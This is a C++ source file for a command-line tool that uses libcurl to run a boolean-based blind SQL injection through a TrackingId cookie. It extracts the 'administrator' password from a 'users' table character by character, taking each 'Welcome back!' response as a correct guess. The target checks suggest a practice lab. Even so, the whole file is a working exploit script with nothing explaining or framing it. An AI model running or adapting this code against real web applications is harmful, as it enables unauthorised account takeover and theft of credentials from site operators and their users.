#include <iostream>
#include <string>
#include <curl/curl.h>

size_t writefunc(void* ptr, size_t size, size_t nmemb, std::string* s)
{
    s->append(static_cast<char*>(ptr), size * nmemb);
    return size * nmemb;
}

void bruteforcePassword(const std::string& url, const std::string& trackingId, const std::string& sessionCookie) {
    std::string extractedPassword;
    std::string responseBody;

    CURL* curl;
    CURLcode res;

    curl = curl_easy_init();

    if (curl) {
        curl_easy_setopt(curl, CURLOPT_URL, url.c_str());
        for (int i = 1; i <= 20; i++) {
            for (int j = 47; j < 123; j++) {
                std::string payload = "'and (select ascii(substring(password," + std::to_string(i) + ", 1)) from users where username = 'administrator') = '" + std::to_string(j) + "'--";
                char* encodedPayload = curl_easy_escape(curl, payload.c_str(), payload.length());

                std::string fullTrackingId = trackingId + std::string(encodedPayload);
                curl_free(encodedPayload);

                std::string cookieData = "TrackingId=" + fullTrackingId + "; session=" + sessionCookie;

                curl_easy_setopt(curl, CURLOPT_COOKIE, cookieData.c_str());
                curl_easy_setopt(curl, CURLOPT_WRITEFUNCTION, writefunc);
                curl_easy_setopt(curl, CURLOPT_WRITEDATA, &responseBody);
                responseBody.clear();

                res = curl_easy_perform(curl);

                if (res == CURLE_OK) {
                    if (responseBody.find("Welcome back!") != std::string::npos) {
                        extractedPassword += static_cast<char>(j);
                        break;
                    }
                    else {
                        std::cout << '\r' + extractedPassword + static_cast<char>(j + 1);
                    }
                }
                else {
                    std::cout << curl_easy_strerror(res);
                    exit(1);
                }
            }
        }
    }
    curl_easy_cleanup(curl);
}

void displayHelp() {
    std::cout
        << "Usage:\n"
        << "    Linux & macOS: ./BlindSQLi -u [url] -t [trackingId] -s [sessionCookie]\n"
        << "    Windows:       BlindSQLi.exe -u [url] -t [trackingId] -s [sessionCookie]\n"
        << "\nCommands:\n"
        << "    -h, --help              Displays help information.\n"
        << "    -u, --url               Specifies target URL.\n"
        << "    -t, --trackingId        Specifies the tracking ID.\n"
        << "    -s, --sessionCookie     Specifies the session cookie.\n";
}

int main(int argc, char* argv[]) {
    std::string url;
    std::string trackingId;
    std::string sessionCookie;

    for (int i = 1; i < argc; i++) {
        if (std::string(argv[i]) == "-h" || std::string(argv[i]) == "--help") {
            displayHelp();
            return 0;
        }
        else if (std::string(argv[i]) == "-u" || std::string(argv[i]) == "--url") {
            if (i + 1 < argc) {
                url = argv[i + 1];
                i++;
            }
            else {
                std::cerr << "Error: No URL provided after the " << argv[i] << " switch." << std::endl;
                return 1;
            }
        }
        else if (std::string(argv[i]) == "-t" || std::string(argv[i]) == "--trackingId") {
            if (i + 1 < argc) {
                trackingId = argv[i + 1];
                i++;
            }
            else {
                std::cerr << "Error: No tracking ID provided after the " << argv[i] << " switch." << std::endl;
                return 1;
            }
        }
        else if (std::string(argv[i]) == "-s" || std::string(argv[i]) == "--sessionCookie") {
            if (i + 1 < argc) {
                sessionCookie = argv[i + 1];
                i++;
            }
            else {
                std::cerr << "Error: No session cookie provided after the " << argv[i] << " switch." << std::endl;
                return 1;
            }
        }
    }

    std::cout << "[+] Retrieving administrator password..." << std::endl;
    bruteforcePassword(url, trackingId, sessionCookie);

    return 0;
}